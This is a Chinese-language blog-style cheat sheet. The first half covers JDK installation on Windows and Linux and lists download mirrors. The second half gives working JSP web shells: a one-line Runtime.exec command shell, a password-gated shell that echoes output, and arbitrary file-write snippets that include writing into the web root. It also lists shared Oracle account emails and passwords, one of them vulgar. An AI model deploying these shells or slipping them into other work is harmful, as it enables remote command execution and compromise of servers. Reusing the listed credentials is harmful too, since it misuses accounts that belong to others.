---
date: 2024-10-29
title: Java/JSP环境搭建与安全相关操作全解析
authors: [SecCMD]
description: >
 全面介绍Java/JSP开发相关内容，涵盖自动化与手动安装JDK的详细步骤，包括Windows和Linux系统下的安装方法，还提供Java下载地址及特殊账号。同时深入讲解Java/JSP安全相关操作，如无回显与有回显的命令执行、文件写入及编码原理等，为Java开发者及安全从业者提供一站式知识服务。
categories: 编程开发, 网络安全
tags:
  - Java
  - JSP
  - JDK安装
  - 命令执行
  - 文件写入
  - 网络安全
  - 编程开发
---

# Java/JSP

### 自动化安装脚本
```
curl -o jdk-18_windows-x64_bin.exe  https://d6.injdk.cn/oraclejdk/18/jdk-18_windows-x64_bin.exe
jdk-18_windows-x64_bin.exe /s
# 静默安装完成，需要重新打开一个 CMD 窗口。
java -version 
echo %PATH%
echo %JAVA_HOME%
# 参考 Java 18 Silent Install https://silentinstallhq.com/java-18-silent-install-how-to-guide/
```

### Windows 手动安装 JDK（主要提升Win安装效率）
```
http://www.codebaoku.com/jdk/jdk-install-windows.html
1. 下载完成后双击jdk-8u271-windows-x64.exe文件。
2. 环境变量的配置 JAVA_HOME CLASSPATH PATH
```

## Linux 安装JDK （首先使用 apt yum方式）
```
http://www.codebaoku.com/jdk/jdk-install-linux.html
mkdir /usr/java/
tar -zxvf jdk-8u171-Linux-x64.tar.gz -C /usr/java/
#//环境变量在将会在 /etc/profile 文件中配置，为了防止配置错误，建议先将改文件负责进行备份。
#//备份 /etc/profile 文件
cp /etc/profile /etc/profile.bak
#//编辑 profile 文件，输入 vi /etc/prifle ，然后定位到这个文件的最后面。再按住字母 o ，开启编辑模式。
#//复制下面的内容粘贴到vi编辑器（注意 JAVA_HOME 这个路径，应该写成你刚刚解压的目录）。
export JAVA_HOME=/usr/local/java/jdk1.8.0_171
export JRE_HOME=${JAVA_HOME}/jre
export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
export PATH=${JAVA_HOME}/bin:$PATH
#//让 /etc/profile 文件生效，
source /etc/profile    
#//检查是否配置成功，如果现实了版本信息，那么则证明配置成功。
javac -version
```

###  Java 下载地址
```
（0）http://www.codebaoku.com/jdk/jdk-index.html
（1）TUNA镜像 https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/
（2）HUAWEI镜像 https://repo.huaweicloud.com/java/jdk/
（3）injdk https://www.injdk.cn/
```

### Oracle 共享账号 用于JDK下载
```
http://www.codebaoku.com/jdk/jdk-oracle-account.html

账号	密码
bnptrhinldfoguijh@mytrashmailer.com	#&qRfvE7rg37GhjEfDJy
sosen65433@kahase.com	SuckMyDick123!@#
erfede@yopmail.com	Bellapete!1
mqkpexeozyceyccghg@nthrl.com	weLgKcEdnc8PGua/
ttauern@trash-mail.com	nhXpiFpk3KztJ43
```

### 一、无回显的命令执行（命令执行后不会在前端页面返回数据）


```
<%Runtime.getRuntime().exec(request.getParameter("i"));%>

请求url：http://127.0.0.1/shell.jsp?i=whoami
```


### 二、有回显带密码的命令执行（命令执行后会在前端返回数据）

```
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```



### 三、文件写入（改写目标服务器里的文件,若文件不存在则创建）

```markdown
1. ISO-8859-1输入:
new java.io.FileOutputStream(request.getParameter("file")).write(request.getParameter("content").getBytes());
请求url：http://127.0.0.1/input.jsp?file=root/test.txt&content=test

2. UTF-8输入:
new java.io.FileOutputStream(request.getParameter("file")).write(new String(request.getParameter("content").getBytes("ISO-8859-1"), "UTF-8").getBytes());
请求url：http://127.0.0.1/input.jsp?file=root/test.txt&content=test

3. Web目录写入;
new java.io.FileOutputStream(application.getRealPath("/") + "/" + request.getParameter("filename")).write(request.getParameter("content").getBytes());
请求url：http://127.0.0.1/input.jsp?file=test.txt&content=test
```


### 四、编码相关

Runtime-exec 编码原理 https://www.jianshu.com/p/ae3922db1f70

Runtime-exec 编码工具 https://www.bugku.net/runtime-exec-payloads/

Java在线运行环境 https://www.w3cschool.cn/tryrun/runcode?lang=java-openjdk
